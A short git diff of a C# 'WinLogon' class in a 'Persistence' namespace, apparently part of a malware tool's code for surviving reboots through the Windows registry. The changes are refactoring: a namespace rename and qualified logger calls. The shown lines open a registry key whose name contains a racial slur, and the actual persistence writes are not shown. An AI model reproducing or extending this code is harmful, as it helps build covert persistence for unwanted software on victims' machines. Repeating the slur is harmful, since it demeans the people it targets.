@@ -1,6 +1,6 @@
 ﻿using Microsoft.Win32;
 
-namespace Main.Source.Utilities.Persistence
+namespace Main.Source.Functions.Persistence
 {
     public class WinLogon
     {
@@ -11,7 +11,7 @@ namespace Main.Source.Utilities.Persistence
             var logon = Registry.CurrentUser.OpenSubKey("Software\\_nigger", true);
             if (logon == null)
             {
-                Logger.Warn("WinLogon.Install: failed to open run");
+                Utilities.Logger.Warn("WinLogon.Install: failed to open run");
             }
             else
             {
@@ -21,7 +21,7 @@ namespace Main.Source.Utilities.Persistence
                 }
                 catch
                 {
-                    Logger.Warn($"WinLogon.Install: failed to install");
+                    Utilities.Logger.Warn($"WinLogon.Install: failed to install");
                 }
             }
         }
@@ -31,7 +31,7 @@ namespace Main.Source.Utilities.Persistence
             var logon = Registry.CurrentUser.OpenSubKey("Software\\_nigger", true);
             if (logon == null)
             {
-                Logger.Warn("WinLogon.Uninstall: failed to open run");
+                Utilities.Logger.Warn("WinLogon.Uninstall: failed to open run");
             }
             else
             {
@@ -41,7 +41,7 @@ namespace Main.Source.Utilities.Persistence
                 }
                 catch
                 {
-                    Logger.Warn($"WinLogon.Uninstall: failed to uninstall");
+                    Utilities.Logger.Warn($"WinLogon.Uninstall: failed to uninstall");
                 }
             }
         }
